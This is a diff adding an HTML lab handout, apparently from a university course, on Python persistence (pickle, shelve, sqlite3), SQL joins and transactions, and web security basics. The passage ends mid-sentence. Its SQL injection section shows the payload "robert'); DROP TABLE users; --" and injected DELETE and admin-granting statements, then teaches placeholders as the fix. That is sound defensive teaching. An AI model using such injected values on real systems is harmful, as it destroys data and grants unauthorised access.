@@ -1,0 +1,1056 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="generator" content="Docutils 0.4: http://docutils.sourceforge.net/" />
+<title>Lab #14 -- Databases; security</title>
+<style type="text/css">
+
+/*
+:Author: David Goodger
+:Contact: goodger@users.sourceforge.net
+:Date: $Date: 2005-12-18 01:56:14 +0100 (Sun, 18 Dec 2005) $
+:Revision: $Revision: 4224 $
+:Copyright: This stylesheet has been placed in the public domain.
+
+Default cascading style sheet for the HTML output of Docutils.
+
+See http://docutils.sf.net/docs/howto/html-stylesheets.html for how to
+customize this style sheet.
+*/
+
+/* used to remove borders from tables and images */
+.borderless, table.borderless td, table.borderless th {
+  border: 0 }
+
+table.borderless td, table.borderless th {
+  /* Override padding for "table.docutils td" with "! important".
+     The right padding separates the table cells. */
+  padding: 0 0.5em 0 0 ! important }
+
+.first {
+  /* Override more specific margin styles with "! important". */
+  margin-top: 0 ! important }
+
+.last, .with-subtitle {
+  margin-bottom: 0 ! important }
+
+.hidden {
+  display: none }
+
+a.toc-backref {
+  text-decoration: none ;
+  color: black }
+
+blockquote.epigraph {
+  margin: 2em 5em ; }
+
+dl.docutils dd {
+  margin-bottom: 0.5em }
+
+/* Uncomment (and remove this text!) to get bold-faced definition list terms
+dl.docutils dt {
+  font-weight: bold }
+*/
+
+div.abstract {
+  margin: 2em 5em }
+
+div.abstract p.topic-title {
+  font-weight: bold ;
+  text-align: center }
+
+div.admonition, div.attention, div.caution, div.danger, div.error,
+div.hint, div.important, div.note, div.tip, div.warning {
+  margin: 2em ;
+  border: medium outset ;
+  padding: 1em }
+
+div.admonition p.admonition-title, div.hint p.admonition-title,
+div.important p.admonition-title, div.note p.admonition-title,
+div.tip p.admonition-title {
+  font-weight: bold ;
+  font-family: sans-serif }
+
+div.attention p.admonition-title, div.caution p.admonition-title,
+div.danger p.admonition-title, div.error p.admonition-title,
+div.warning p.admonition-title {
+  color: red ;
+  font-weight: bold ;
+  font-family: sans-serif }
+
+/* Uncomment (and remove this text!) to get reduced vertical space in
+   compound paragraphs.
+div.compound .compound-first, div.compound .compound-middle {
+  margin-bottom: 0.5em }
+
+div.compound .compound-last, div.compound .compound-middle {
+  margin-top: 0.5em }
+*/
+
+div.dedication {
+  margin: 2em 5em ;
+  text-align: center ;
+  font-style: italic }
+
+div.dedication p.topic-title {
+  font-weight: bold ;
+  font-style: normal }
+
+div.figure {
+  margin-left: 2em ;
+  margin-right: 2em }
+
+div.footer, div.header {
+  clear: both;
+  font-size: smaller }
+
+div.line-block {
+  display: block ;
+  margin-top: 1em ;
+  margin-bottom: 1em }
+
+div.line-block div.line-block {
+  margin-top: 0 ;
+  margin-bottom: 0 ;
+  margin-left: 1.5em }
+
+div.sidebar {
+  margin-left: 1em ;
+  border: medium outset ;
+  padding: 1em ;
+  background-color: #ffffee ;
+  width: 40% ;
+  float: right ;
+  clear: right }
+
+div.sidebar p.rubric {
+  font-family: sans-serif ;
+  font-size: medium }
+
+div.system-messages {
+  margin: 5em }
+
+div.system-messages h1 {
+  color: red }
+
+div.system-message {
+  border: medium outset ;
+  padding: 1em }
+
+div.system-message p.system-message-title {
+  color: red ;
+  font-weight: bold }
+
+div.topic {
+  margin: 2em }
+
+h1.section-subtitle, h2.section-subtitle, h3.section-subtitle,
+h4.section-subtitle, h5.section-subtitle, h6.section-subtitle {
+  margin-top: 0.4em }
+
+h1.title {
+  text-align: center }
+
+h2.subtitle {
+  text-align: center }
+
+hr.docutils {
+  width: 75% }
+
+img.align-left {
+  clear: left }
+
+img.align-right {
+  clear: right }
+
+ol.simple, ul.simple {
+  margin-bottom: 1em }
+
+ol.arabic {
+  list-style: decimal }
+
+ol.loweralpha {
+  list-style: lower-alpha }
+
+ol.upperalpha {
+  list-style: upper-alpha }
+
+ol.lowerroman {
+  list-style: lower-roman }
+
+ol.upperroman {
+  list-style: upper-roman }
+
+p.attribution {
+  text-align: right ;
+  margin-left: 50% }
+
+p.caption {
+  font-style: italic }
+
+p.credits {
+  font-style: italic ;
+  font-size: smaller }
+
+p.label {
+  white-space: nowrap }
+
+p.rubric {
+  font-weight: bold ;
+  font-size: larger ;
+  color: maroon ;
+  text-align: center }
+
+p.sidebar-title {
+  font-family: sans-serif ;
+  font-weight: bold ;
+  font-size: larger }
+
+p.sidebar-subtitle {
+  font-family: sans-serif ;
+  font-weight: bold }
+
+p.topic-title {
+  font-weight: bold }
+
+pre.address {
+  margin-bottom: 0 ;
+  margin-top: 0 ;
+  font-family: serif ;
+  font-size: 100% }
+
+pre.literal-block, pre.doctest-block {
+  margin-left: 2em ;
+  margin-right: 2em ;
+  background-color: #eeeeee }
+
+span.classifier {
+  font-family: sans-serif ;
+  font-style: oblique }
+
+span.classifier-delimiter {
+  font-family: sans-serif ;
+  font-weight: bold }
+
+span.interpreted {
+  font-family: sans-serif }
+
+span.option {
+  white-space: nowrap }
+
+span.pre {
+  white-space: pre }
+
+span.problematic {
+  color: red }
+
+span.section-subtitle {
+  /* font-size relative to parent (h1..h6 element) */
+  font-size: 80% }
+
+table.citation {
+  border-left: solid 1px gray;
+  margin-left: 1px }
+
+table.docinfo {
+  margin: 2em 4em }
+
+table.docutils {
+  margin-top: 0.5em ;
+  margin-bottom: 0.5em }
+
+table.footnote {
+  border-left: solid 1px black;
+  margin-left: 1px }
+
+table.docutils td, table.docutils th,
+table.docinfo td, table.docinfo th {
+  padding-left: 0.5em ;
+  padding-right: 0.5em ;
+  vertical-align: top }
+
+table.docutils th.field-name, table.docinfo th.docinfo-name {
+  font-weight: bold ;
+  text-align: left ;
+  white-space: nowrap ;
+  padding-left: 0 }
+
+h1 tt.docutils, h2 tt.docutils, h3 tt.docutils,
+h4 tt.docutils, h5 tt.docutils, h6 tt.docutils {
+  font-size: 100% }
+
+tt.docutils {
+  background-color: #eeeeee }
+
+ul.auto-toc {
+  list-style-type: none }
+
+</style>
+</head>
+<body>
+<div class="document" id="lab-14-databases-security">
+<h1 class="title">Lab #14 -- Databases; security</h1>
+<p>A programming joke:</p>
+<p>---</p>
+<p>Knock, knock.</p>
+<p>&quot;Who's there?&quot;</p>
+<p>very long pause...</p>
+<p>&quot;Java.&quot;</p>
+<div class="section">
+<h1><a id="data-persistence-and-acid" name="data-persistence-and-acid">Data persistence and ACID</a></h1>
+<p>You want your databases to be ACID compliant.</p>
+</div>
+<div class="section">
+<h1><a id="pickle-shelve-and-bsddb" name="pickle-shelve-and-bsddb">Pickle, shelve, and bsddb</a></h1>
+<p>Python possesses a native serialization format that allows objects
+to be written into a string (and thence to disk), called 'pickle'.
+You use 'pickle.dump' to save:</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; import pickle
+&gt;&gt;&gt; obj_to_save = [ &quot;foo&quot;, 5, 8.2 ]
+&gt;&gt;&gt; fp = open('some_file', 'w')
+&gt;&gt;&gt; pickle.dump(obj_to_save, fp)
+&gt;&gt;&gt; fp.close()
+</pre>
+</blockquote>
+<p>Now you can use 'pickle.load' to reload:</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; fp = open('some_file')
+&gt;&gt;&gt; x = pickle.load(fp)
+&gt;&gt;&gt; print x
+[ &quot;foo&quot;, 5, 8.2 ]
+</pre>
+</blockquote>
+<p>Voila!</p>
+<p>So, one way to persist the messages, users, and sessions in meeplib
+(see HW) is to simply pickle the dictionaries.  However, then every
+time you make a chance to the dictionaries you need to save them
+again, which (for large #s of users) can get big.</p>
+<p>The 'shelve' module lets you save individual objects in a database
+by putting pickle on top of a database:</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; import shelve
+&gt;&gt;&gt; db = shelve.open('foo.db')
+&gt;&gt;&gt; db['some key'] = [ &quot;foo&quot;, 5, 8.2 ]
+&gt;&gt;&gt; db.sync()
+</pre>
+</blockquote>
+<p>Now you can</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; db.close()
+&gt;&gt;&gt; db = shelve.open('foo.db')
+&gt;&gt;&gt; print db['some_key']
+[ 'foo', 5, 8.2 ]
+</pre>
+</blockquote>
+<p>You can do this with Message objects, User objects, and session information,
+too...</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; from meeplib import Message
+&gt;&gt;&gt; u = User('test', 'foo')
+&gt;&gt;&gt; m = Message('some title', 'some post', u)
+</pre>
+<pre class="doctest-block">
+&gt;&gt;&gt; db[str(m.id)] = m
+</pre>
+</blockquote>
+<p>Note that shelve doesn't let you store things by integer key, so you need
+to store the record by a string conversion of the key.</p>
+</div>
+<div class="section">
+<h1><a id="relational-databases-and-sql" name="relational-databases-and-sql">Relational databases and SQL</a></h1>
+<p>Basic SQL concepts:</p>
+<p>Start by creating/defining a &quot;schema&quot;</p>
+<p>Schema contains a description of each table (collection of related data)
+in terms of <em>columns</em> (names/types of data).  Each table can then have
+multiple <em>rows</em>.  (...a bit like a spreadsheet)</p>
+<blockquote>
+<ul>
+<li><p class="first">strong types: INT, TEXT, FLOAT</p>
+</li>
+<li><p class="first">pickiness</p>
+</li>
+<li><p class="first">non-default values</p>
+<p>CREATE TABLE x (a TYPE, b TYPE, c TYPE)</p>
+</li>
+</ul>
+</blockquote>
+<p>Adding, updating, and deleting data</p>
+<blockquote>
+<p>INSERT</p>
+<p>UPDATE</p>
+<p>DELETE FROM</p>
+</blockquote>
+<p>Selecting data from a single table 'a'</p>
+<blockquote>
+SELECT * FROM a</blockquote>
+<p>Selecting data from multiple tables 'a', 'b', 'c'</p>
+<blockquote>
+SELECT * FROM a, b, c WHERE a.id = b.id AND b.id = c.id</blockquote>
+<p>Cartesian join (all x all) vs ...</p>
+<p>Primary keys</p>
+<p>References between tables --</p>
+<blockquote>
+<dl class="docutils">
+<dt>&quot;referential constraint&quot; -- &quot;if a row in this table exists, a corresponding</dt>
+<dd>row in this other table must also exist&quot;</dd>
+</dl>
+<p>enables speedup/indexing on SELECT, as well</p>
+</blockquote>
+<p>Transactions and isolation between transactions</p>
+<blockquote>
+BEGIN TRANSACTION
+COMMIT
+ROLLBACK</blockquote>
+<p>SQL injection attacks</p>
+<blockquote>
+<p>If you let someone remote inject SQL queries then you will regret it :) --
+imagine,</p>
+<blockquote>
+DELETE FROM users</blockquote>
+<p>or</p>
+<blockquote>
+INSERT INTO users (username, is_admin) VALUES ('me', 't')</blockquote>
+</blockquote>
+<p>Thinks to think about:</p>
+<p>Where does the processing happen?</p>
+<p>Permissions/access to database &amp; file</p>
+<p>Constraints on data.</p>
+<p>Full documentation for the Python interface to sqlite, the sqlite3 module,
+here:</p>
+<blockquote>
+<a class="reference" href="http://www.python.org/doc/2.5.2/lib/module-sqlite3.html">http://www.python.org/doc/2.5.2/lib/module-sqlite3.html</a></blockquote>
+<p>Documentation for sqlite's query language is here:</p>
+<blockquote>
+<a class="reference" href="http://www.sqlite.org/lang.html">http://www.sqlite.org/lang.html</a></blockquote>
+<p>Note that sqlite3 is not installed under the central Python
+distribution on arctic.  You need to use it on adriatic.</p>
+</div>
+<div class="section">
+<h1><a id="sqlite-basics" name="sqlite-basics">sqlite basics</a></h1>
+<p>First, load in a database with 'connect':</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; import sqlite3
+&gt;&gt;&gt; conn = sqlite3.connect('test.db')
+</pre>
+</blockquote>
+<p>Now, get a <em>cursor</em> that lets you interact with the database:</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c = conn.cursor()
+</pre>
+</blockquote>
+<p>Let's start by creating a simple table:</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT NOT NULL, password TEXT NOT NULL)&quot;)
+</pre>
+</blockquote>
+<p>Now let's insert some data into it:</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;INSERT INTO users (username, password) VALUES ('tim', 'xxx')&quot;)
+</pre>
+</blockquote>
+<p>We can immediately retrieve this with a SELECT:</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;SELECT * FROM users&quot;)
+&gt;&gt;&gt; print c.fetchall()
+[(1, u'tim', u'xxx')]
+</pre>
+</blockquote>
+<p>We get the strings back as Unicode strings; that's what the &quot;u&quot; means.
+You can treat these as regular strings for all intents and purposes.</p>
+<p>Note here that the primary index value 'id' was automatically
+assigned; we didn't specify a value on the INSERT, but sqlite knows
+that primary key values should be automatically set.</p>
+<p>What happens if we don't specify a value on an INSERT?  Well, by
+default, unspecified values are set to NULL; in this case, however, we
+specified that the username and password <em>can't</em> be NULL.  What happens?</p>
+<p>Well, let's see:</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;INSERT INTO users (username) VALUES ('fiddledy')&quot;)
+Traceback (most recent call last):
+   ...
+IntegrityError: users.password may not be NULL
+</pre>
+</blockquote>
+<p>Yep, an exception...</p>
+<p>All right, let's create another table, this one with a key that references
+'users':</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute('CREATE TABLE fruits (user_id INTEGER REFERENCES users, fruit TEXT NOT NULL)')
+</pre>
+</blockquote>
+<p>Now we can assign 'tim', our lone user, a fruit:</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;INSERT INTO fruits (user_id, fruit) VALUES (1, 'orange')&quot;)
+</pre>
+</blockquote>
+<p>and we can retrieve Tim's fruit preferences using a join:</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute('SELECT * FROM users, fruits WHERE users.id = fruits.user_id')
+&gt;&gt;&gt; print c.fetchall()
+[(1, u'tim', u'xxx', 1, u'orange')]
+</pre>
+</blockquote>
+<p>So what are these values?  Well, the 'SELECT *' just tells sqlite to pull
+out all of the values in both tables, joining them into one big row -- so
+the first three values are users.id, users.username, and users.password,
+and the last two values are fruits.user_id and fruits.fruit.  You can clean
+this up a bit by specifying exactly what you want to be retrieved:</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute('SELECT users.username, users.password, fruits.fruit FROM users, fruits WHERE users.id = fruits.user_id')
+&gt;&gt;&gt; for x in c:
+...    print x
+(u'tim', u'xxx', u'orange')
+</pre>
+</blockquote>
+<p>We can also change the name of the fruit if we want to, by doing an UPDATE:</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;UPDATE fruits SET fruit='Orangen' WHERE fruit='orange'&quot;)
+</pre>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute('SELECT users.username, users.password, fruits.fruit FROM users, fruits WHERE users.id = fruits.user_id')
+&gt;&gt;&gt; for x in c:
+...    print x
+(u'tim', u'xxx', u'Orangen')
+</pre>
+</blockquote>
+<p>What if we want to delete things?   Simplicity itself:</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;DELETE FROM fruits WHERE fruit='Orangen'&quot;)
+&gt;&gt;&gt; c.execute('SELECT users.username, users.password, fruits.fruit FROM users, fruits WHERE users.id = fruits.user_id')
+&gt;&gt;&gt; print c.fetchall()
+[]
+</pre>
+</blockquote>
+<p>Yep, nothing left!</p>
+<p>OK, let's set up some more complicated examples.  Three users, four fruits...</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;INSERT INTO users (username, password) VALUES ('beth', 'foo')&quot;)
+&gt;&gt;&gt; c.execute(&quot;INSERT INTO users (username, password) VALUES ('chet', 'fib')&quot;)
+</pre>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;SELECT id FROM users WHERE username='tim'&quot;)
+&gt;&gt;&gt; (tim_id,) = c.fetchone()
+</pre>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;SELECT id FROM users WHERE username='beth'&quot;)
+&gt;&gt;&gt; (beth_id,) = c.fetchone()
+</pre>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;INSERT INTO fruits (user_id, fruit) VALUES (?, 'orange')&quot;, (tim_id,))
+</pre>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;INSERT INTO fruits (user_id, fruit) VALUES (?, 'apple')&quot;, (beth_id,))
+&gt;&gt;&gt; c.execute(&quot;INSERT INTO fruits (user_id, fruit) VALUES (?, 'orange')&quot;, (beth_id,))
+</pre>
+</blockquote>
+<p>OK, so we've set things up so that tim likes oranges, beth likes
+apples and oranges, and chet doesn't like any fruit.  Let's start by
+doing a simple query to retrieve all of this info:</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;SELECT users.id, username, fruit FROM users, fruits WHERE fruits.user_id=users.id&quot;)
+&gt;&gt;&gt; for (id, username, fruit) in c:
+...    print id, username, fruit
+1 tim orange
+2 beth apple
+2 beth orange
+</pre>
+</blockquote>
+<p>Good so far!</p>
+<p>In class I mentioned that joins are done using a Cartesian cross product; what does that mean?  Well, let's see what happens without a WHERE clause:</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute('SELECT users.id, username, fruit FROM users, fruits')
+&gt;&gt;&gt; for (id, username, fruit) in c:
+...   print id, username, fruit
+1 tim orange
+1 tim apple
+1 tim orange
+2 beth orange
+2 beth apple
+2 beth orange
+3 chet orange
+3 chet apple
+3 chet orange
+</pre>
+</blockquote>
+<p>What!?  Well, what's happening here is that without a WHERE clause,
+the join by default takes all rows from both tables, and combines
+them.  If you ever find yourself getting unexpected results from a SELECT,
+this may be one of the reasons.</p>
+<p>Let's go back to the correct join:</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;SELECT users.id, username, fruit FROM users, fruits WHERE fruits.user_id=users.id&quot;)
+&gt;&gt;&gt; for (id, username, fruit) in c:
+...    print id, username, fruit
+1 tim orange
+2 beth apple
+2 beth orange
+</pre>
+</blockquote>
+<p>Note how the results are in order of ID: that's an accident. sqlite
+gives no guarantees on the order of the output from a SELECT query,
+<strong>unless</strong> you specify an ORDER BY clause.  So, for example, we can
+arrange things here by fruit and then by id by specifying that fruit
+should be sorted in ascending order (abbreviated ASC), and equal fruit
+rows should then be secondarily sorted on the id in descending order
+(DESC):</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;SELECT users.id, username, fruit FROM users, fruits WHERE fruits.user_id=users.id ORDER BY fruit ASC, id DESC&quot;)
+&gt;&gt;&gt; for (id, username, fruit) in c:
+...    print id, username, fruit
+2 beth apple
+2 beth orange
+1 tim orange
+</pre>
+</blockquote>
+<p>OK, now let's do something a bit different -- let's count the number of fruits that each person likes.</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;SELECT username, COUNT(fruit) FROM users, fruits WHERE fruits.user_id = users.id GROUP BY users.id&quot;)
+&gt;&gt;&gt; c.fetchall()
+[(u'tim', 1), (u'beth', 2)]
+</pre>
+</blockquote>
+<p>What does the GROUP BY do?  Well, COUNT is an aggregate function that
+works <em>across</em> multiple rows; GROUP BY says that rows should be
+grouped together on the basis of their users.id value, so COUNT is
+only run across the grouped-by rows.</p>
+<p>Hmm, but wait a sec -- where's chet?  Chet doesn't like any fruits, so
+we should get a zero for him, right?  Well, yes, but you might have
+noticed that chet doesn't actually appear in <em>any</em> of the queries above.
+What's up?</p>
+<p>Well, with a default join, SQL doesn't represent nonexistent joined
+rows!  That is, it's hard for SQL to report rows that don't exist --
+unless you tell it to put NULLs there.  That's what a LEFT JOIN does:</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;SELECT id, username, fruit FROM users LEFT JOIN fruits ON fruits.user_id=users.id&quot;)
+&gt;&gt;&gt; for (id, username, fruit) in c:
+...    print id, username, fruit
+1 tim orange
+2 beth apple
+2 beth orange
+3 chet None
+</pre>
+</blockquote>
+<p>Hey, look, there's chet!  What happens if we do the GROUP BY again?</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;SELECT username, COUNT(fruit) FROM users LEFT JOIN fruits ON fruits.user_id=users.id GROUP BY users.id&quot;)
+&gt;&gt;&gt; c.fetchall()
+[(u'tim', 1), (u'beth', 2), (u'chet', 0)]
+</pre>
+</blockquote>
+<p>COUNT understands that a NULL means nothin' there, so that's good.</p>
+<div class="section">
+<h2><a id="transactions" name="transactions">Transactions</a></h2>
+<p>sqlite does support transactions; how does this work?</p>
+<p>Let's start with our last example:</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;SELECT username, COUNT(fruit) FROM users LEFT JOIN fruits ON fruits.user_id=users.id GROUP BY users.id&quot;)
+&gt;&gt;&gt; c.fetchall()
+[(u'tim', 1), (u'beth', 2), (u'chet', 0)]
+</pre>
+</blockquote>
+<p>Now let's delete 'tim':</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;DELETE FROM users WHERE username='tim'&quot;)
+</pre>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;SELECT username, COUNT(fruit) FROM users LEFT JOIN fruits ON fruits.user_id=users.id GROUP BY users.id&quot;)
+&gt;&gt;&gt; c.fetchall()
+[(u'beth', 2), (u'chet', 0)]
+</pre>
+</blockquote>
+<p>OK, so tim isn't in there any more; excellent.  But we haven't saved it, so
+if we opened the sqlite database from another program, 'tim' would still be
+there.  We can save it for public view by doing a 'conn.commit()':</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; conn.commit()
+</pre>
+</blockquote>
+<p>What if we decided for some reason that we didn't want to commit the change,
+but rather wanted to reverse it?  Well, let's try deleting 'chet':</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;DELETE FROM users WHERE username='chet'&quot;)
+</pre>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;SELECT username, COUNT(fruit) FROM users LEFT JOIN fruits ON fruits.user_id=users.id GROUP BY users.id&quot;)
+&gt;&gt;&gt; c.fetchall()
+[(u'beth', 2)]
+</pre>
+</blockquote>
+<p>..but oops, we didn't want to save that -- rollback!</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; conn.rollback()
+</pre>
+</blockquote>
+<p>Is chet still there?</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute(&quot;SELECT username, COUNT(fruit) FROM users LEFT JOIN fruits ON fruits.user_id=users.id GROUP BY users.id&quot;)
+&gt;&gt;&gt; c.fetchall()
+[(u'beth', 2), (u'chet', 0)]
+</pre>
+</blockquote>
+<p>Yep!</p>
+<p>For now, all you really need to do is to be sure to call
+'conn.commit()' in order to save any actions that you want saved.</p>
+</div>
+<div class="section">
+<h2><a id="sql-injection-and-positional-parameters" name="sql-injection-and-positional-parameters">SQL injection and positional parameters</a></h2>
+<p>If you create queries by concatenating or interpolating strings that
+come directly from the user, they can &quot;attack&quot; your database by
+sending you straight SQL strings.  For example, suppose you were
+inserting a new username and password into the users table</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; username=&quot;robert'); DROP TABLE users; --&quot;
+&gt;&gt;&gt; password=&quot;foo&quot;
+&gt;&gt;&gt; sql = &quot;INSERT INTO users (username, password) VALUES ('%s', '%s')&quot; % (username, password)
+&gt;&gt;&gt; print sql
+INSERT INTO users (username, password) VALUES ('robert'); DROP TABLE users; --, 'foo');
+</pre>
+</blockquote>
+<p>Now if you execute that, what happens?  The users table will go away...</p>
+<p>So, the general problem is that user-specified data may well be badly
+formatted and can screw up (intentionally or unintentionally) your SQL
+queries.  How do you deal with this?!</p>
+<p>Well, almost all SQL interfaces in all languages offer safe variable
+interpolation via <em>placeholders</em>, that is, you just a '?' in as a place
+holder and the SQL interface inserts the values safely:</p>
+<blockquote>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute('INSERT INTO users (username, password) VALUES (?, ?)', (username, password,))
+</pre>
+<pre class="doctest-block">
+&gt;&gt;&gt; c.execute('SELECT username FROM users ORDER BY username')
+&gt;&gt;&gt; print c.fetchall()
+[(u'beth',), (u'chet',), (u&quot;robert'); DROP TABLE users; --&quot;,), (u'tim',)]
+</pre>
+</blockquote>
+<p>---</p>
+<p>Another joke:</p>
+<p>So, this SQL query walks into a bar, goes up to two tables and says,
+&quot;Can I join you?&quot;</p>
+</div>
+</div>
+<div class="section">
+<h1><a id="security" name="security">Security</a></h1>
+<p>How do we stop bad people from doing bad things?</p>
+<p>&quot;All input is evil until proven otherwise.&quot;</p>
+<p>It is not often done well:</p>
+<img alt="voting_machines.png" src="voting_machines.png" style="width: 600px;" />
+<p><strong>Paranoia is not just a state of mind, it's a way of life.</strong></p>
+<div class="section">
+<h2><a id="goals" name="goals">Goals</a></h2>
+<ol class="arabic simple">
+<li>(Client) Communicate with specific server.</li>
+<li>(Server) Identify user while protecting against <em>systematic</em> user compromise.</li>
+<li>(Client &amp; server) Communicate <em>securely</em> (no eavesdropping)</li>
+<li>(Server) Handle a lot of users.</li>
+</ol>
+<p>Note that &quot;client&quot; cannot be trusted here: could be Evil Canadian
+Hacker, _or_ could simply be genuine malicious user.  The difference
+is not significant for a site!</p>
+<p>Will talk mostly about protocol- and browser-level attacks; network
+infrastructure attacks are also likely but outside our scope!</p>
+</div>
+<div class="section">
+<h2><a id="an-excellent-real-world-example-man-in-the-middle-attack" name="an-excellent-real-world-example-man-in-the-middle-attack">An excellent real-world example: man in the middle attack</a></h2>
+<p>(&quot;MiG in the middle&quot; story.)</p>
+<p>(Could also imagine compromising the endpoints.)</p>
+</div>
+<div class="section">
+<h2><a id="problems" name="problems">Problems</a></h2>
+<p>Statelessness - every connection &quot;starts fresh&quot;, so can't use single
+authentication.  Must communicate data... but is that data secure?</p>
+<p>How do you identify a Web site securely, anyway??</p>
+<p>And then there's eavesdropping.</p>
+<p>So, the parameters of the problem are:</p>
+<blockquote>
+<ul class="simple">
+<li>must identify server</li>
+<li>must protect data in browser from being sent to wrong server</li>
+<li>must protect communications from eavesdroppers</li>
+<li>server must protect against client-altered data, e.g. changed username</li>
+</ul>
+</blockquote>
+</div>
+<div class="section">
+<h2><a id="technologies" name="technologies">Technologies</a></h2>
+<p>Establishing a connection to the right host - DNS, server certificates</p>
+<p>Communicating securely with the host - HTTPS</p>
+<p>Establishing user identity - authentication</p>
+<p>Statelessness - URLs, cookies, and forms</p>
+<p>Preventing large-scale compromise - session IDs and hashing</p>
+</div>
+<div class="section">
+<h2><a id="connection-oriented-security" name="connection-oriented-security">Connection-oriented security</a></h2>
+<p>Looking up Web sites (Domain Name Service, DNS)</p>
+<blockquote>
+<ul class="simple">
+<li>think of it as a phone book: name =&gt; number.</li>
+<li>but a phone book with a hierarchical distrib scheme: master servers
+dynamically updated DNS.</li>
+<li>fairly insecure: your ISP usually gives you the name servers to use
+via DHCP, and you have no guarantee that they are correct or
+untampered with.</li>
+</ul>
+</blockquote>
+<p>Connecting safely to Web sites (HTTPS and server-side certificates)</p>
+<blockquote>
+<ul class="simple">
+<li>S == &quot;Secure Socket Layer&quot;</li>
+<li>end-to-end encryption based on key pairs</li>
+</ul>
+</blockquote>
+<p>How do you know you're talking to the right site??</p>
+<blockquote>
+<ul class="simple">
+<li>digitally-signed certificates: &quot;this site at xxx.yyy.zzz possesses
+a private certificate, signed by BigCentralAuthority&quot;, that identifies
+them as the genuine xxx.yyy.zzz site.&quot;</li>
+<li>umm, how do you know it's xxx.yyy.zzz, anyway?  DNS told you...</li>
+<li>certificates must be hard to forge.</li>
+<li>you must trust BigCentralAuthority to not issue multiple certificates.</li>
+<li>end-to-end makes it proof against man-in-the-middle attacks.</li>
+</ul>
+</blockquote>
+<p>Note: BigCentralAuthority can delegate other sites to issue certificates,
+too, using a chain of trust.</p>
+<p>(Note: Forging connections is not that difficult, and scales.  Taking
+over your computer is easier, but doesn't scale as well..)</p>
+</div>
+<div class="section">
+<h2><a id="social-engineering-or-compromising-the-user" name="social-engineering-or-compromising-the-user">Social engineering, or &quot;compromising the user&quot;</a></h2>
+<p>A sucker is born every minute!</p>
+<p>&quot;Hello, we are the support desk for YourBigBank.  What is your username
+and password so that we can verify your account information?&quot;</p>
+<p>Mangled or confusing or internationalized URLs:</p>
+<blockquote>
+<a class="reference" href="http://www.yourbank.example.com/">http://www.yourbank.example.com/</a>
+<a class="reference" href="http://www.google.com&#64;members.tripod.com/">http://www.google.com&#64;members.tripod.com/</a></blockquote>
+<p>e.g. 0/O and l/1, but with internationalization.</p>
+</div>
+<div class="section">
+<h2><a id="denial-of-service-dos" name="denial-of-service-dos">Denial of Service (DoS)</a></h2>
+<p>&quot;Here's a 1gb file.&quot;</p>
+<p>&quot;Here's another 500 of them.  Tasty?&quot;</p>
+<p>Can saturate:</p>
+<blockquote>
+<ul class="simple">
+<li>connections</li>
+<li>bandwidth</li>
+<li>disk space and RAM</li>
+<li>concurrent connection handling</li>
+</ul>
+</blockquote>
+<p>In some cases (connection, bandwidth) you must protect &#64; network level.</p>
+<p>In other cases (disk space, concurrent connection handling) can regulate
+within the server.</p>
+<p>Most Web servers do not do this well!  Specialized mechanisms exist for
+filtering and proxying.</p>
+</div>
+<div class="section">
+<h2><a id="buffer-overruns" name="buffer-overruns">Buffer overruns</a></h2>
+<p>Server uses a fixed-width buffer of size N; client sends N+ data; remaining
